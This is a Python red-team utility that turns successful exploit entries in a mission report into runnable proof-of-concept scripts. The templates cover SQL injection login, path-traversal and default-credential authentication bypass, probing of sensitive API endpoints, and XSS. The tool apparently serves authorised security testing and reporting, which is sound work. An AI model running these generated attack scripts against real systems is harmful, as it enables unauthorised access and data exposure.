#!/usr/bin/env python
"""
Automated PoC Generator - Creates weaponized proof-of-concept scripts from successful exploits.
"""

import argparse
import json
import os
from pathlib import Path
from typing import Any


def escape_payload(s: str) -> str:
    """Escape single quotes for Python string literals."""
    return s.replace("'", "\\'")


def generate_poc(mission_id: str, exploit: dict[str, Any], exploit_num: int, output_dir: Path) -> str:
    """Generate a PoC script for a single exploit."""
    exploit_type = exploit.get("exploit_type", "unknown").lower()
    target = exploit.get("target", "http://localhost:3000")
    payload = exploit.get("payload_used", {})
    evidence = escape_payload(exploit.get("evidence", "No evidence provided")[:200])
    
    # Format payload
    if isinstance(payload, dict):
        payload_str = str(payload)
    else:
        payload_str = f'"{payload}"'
    
    if exploit_type == "sqli":
        content = f'''#!/usr/bin/env python3
"""
PoC: SQL Injection - {target}
Generated from VibeCheck Red Team mission

VULNERABILITY DETAILS:
{evidence}

Run this script to reproduce the vulnerability.
"""

import requests

TARGET = "{target}"
PAYLOAD = {payload_str}

def main():
    print("[*] Testing SQL Injection on " + TARGET)
    print("[*] Payload: " + str(PAYLOAD))
    
    try:
        response = requests.post(
            TARGET + "/rest/user/login",
            json=PAYLOAD,
            timeout=10
        )
        
        print("[*] Response status: " + str(response.status_code))
        
        if "authentication" in response.text or "token" in response.text:
            print("[+] VULNERABLE! SQL injection successful")
            print("[*] Response:")
            print(response.text[:500])
        else:
            print("[-] Not vulnerable or different response")
            
    except Exception as e:
        print("[!] Error: " + str(e))

if __name__ == "__main__":
    main()
'''
    elif exploit_type == "auth_bypass":
        content = f'''#!/usr/bin/env python3
"""
PoC: Authentication Bypass - {target}
Generated from VibeCheck Red Team mission

VULNERABILITY DETAILS:
{evidence}
"""

import requests

TARGET = "{target}"

def main():
    print("[*] Testing Authentication Bypass on " + TARGET)
    
    # Try common bypass techniques
    payloads = [
        ("GET", TARGET + "/../admin"),
        ("GET", TARGET + "/..;/admin"),
        ("POST", TARGET, {{"username": "admin", "password": "admin"}}),
    ]
    
    for method, url, data in payloads:
        try:
            if data:
                response = requests.request(method, url, json=data, timeout=10)
            else:
                response = requests.request(method, url, timeout=10)
            
            if response.status_code == 200:
                print("[+] Possible bypass: " + url)
                print("[*] Response: " + response.text[:200])
                
        except Exception as e:
            print("[!] Error with " + url + ": " + str(e))

if __name__ == "__main__":
    main()
'''
    elif exploit_type == "info_disclosure":
        content = f'''#!/usr/bin/env python3
"""
PoC: Information Disclosure - {target}
Generated from VibeCheck Red Team mission

VULNERABILITY DETAILS:
{evidence}
"""

import requests

TARGET = "{target}"

ENDPOINTS = [
    "/api/Users",
    "/api/Feedbacks", 
    "/rest/user/whoami",
    "/api/Basket",
    "/rest/admin/Challenges",
]

def main():
    print("[*] Testing Information Disclosure on " + TARGET)
    
    for endpoint in ENDPOINTS:
        url = TARGET.rstrip('/') + endpoint
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200 and len(response.text) > 0:
                print("[+] FOUND: " + endpoint + " (status: " + str(response.status_code) + ")")
                print("[*] Content: " + response.text[:200])
        except Exception as e:
            pass

if __name__ == "__main__":
    main()
'''
    elif exploit_type == "xss":
        content = f'''#!/usr/bin/env python3
"""
PoC: Cross-Site Scripting (XSS) - {target}
Generated from VibeCheck Red Team mission

VULNERABILITY DETAILS:
{evidence}
"""

import requests

TARGET = "{target}"
PAYLOAD = {payload_str}

def main():
    print("[*] Testing XSS on " + TARGET)
    print("[*] Payload: " + str(PAYLOAD))
    
    try:
        response = requests.post(
            TARGET + "/rest/products/search",
            json=PAYLOAD,
            timeout=10
        )
        
        if response.status_code == 200:
            if str(PAYLOAD) in response.text:
                print("[+] VULNERABLE to XSS!")
                
    except Exception as e:
        print("[!] Error: " + str(e))

if __name__ == "__main__":
    main()
'''
    else:
        # Generic template
        content = f'''#!/usr/bin/env python3
"""
PoC: {exploit_type.upper()} - {target}
Generated from VibeCheck Red Team mission

VULNERABILITY DETAILS:
{evidence}
"""

import requests

TARGET = "{target}"

def main():
    print("[*] Testing {exploit_type} on " + TARGET)
    response = requests.get(TARGET, timeout=10)
    print("[*] Status: " + str(response.status_code))
    print("[*] Response: " + response.text[:200])

if __name__ == "__main__":
    main()
'''
    
    # Write the PoC file
    poc_filename = f"poc_{mission_id}_{exploit_num}_{exploit_type}.py"
    poc_path = output_dir / poc_filename
    
    with open(poc_path, "w") as f:
        f.write(content)
    
    os.chmod(poc_path, 0o755)
    
    return poc_filename


def generate_pocs_from_report(report_path: Path, output_dir: Path) -> list:
    """Generate PoCs from a mission report."""
    output_dir.mkdir(parents=True, exist_ok=True)
    
    # Find JSON report
    json_path = report_path.with_suffix(".json") if report_path.suffix != ".json" else report_path
    
    if not json_path.exists():
        print(f"[!] No JSON report found: {json_path}")
        return []
    
    with open(json_path) as f:
        report = json.load(f)
    
    mission_id = report.get("mission_id", "unknown")
    exploits = report.get("exploitation_results", [])
    
    if not exploits:
        exploits = report.get("findings", [])
    
    generated = []
    exploit_num = 1
    
    for exploit in exploits:
        if exploit.get("success", False):
            try:
                filename = generate_poc(mission_id, exploit, exploit_num, output_dir)
                generated.append(filename)
                exploit_num += 1
                print(f"[+] Generated: {filename}")
            except Exception as e:
                print(f"[!] Failed: {e}")
    
    return generated


def main():
    parser = argparse.ArgumentParser(description="Generate PoC scripts from mission reports")
    parser.add_argument("report", help="Path to mission report")
    parser.add_argument("-o", "--output", default="reports/pocs", help="Output directory")
    
    args = parser.parse_args()
    
    report_path = Path(args.report)
    output_dir = Path(args.output)
    
    if not report_path.exists():
        print(f"[!] Report not found: {report_path}")
        return
    
    print(f"[*] Generating PoCs from: {report_path}")
    generated = generate_pocs_from_report(report_path, output_dir)
    
    if generated:
        print(f"\n[+] Generated {len(generated)} PoCs in {output_dir}/")
    else:
        print("[!] No successful exploits found")


if __name__ == "__main__":
    main()
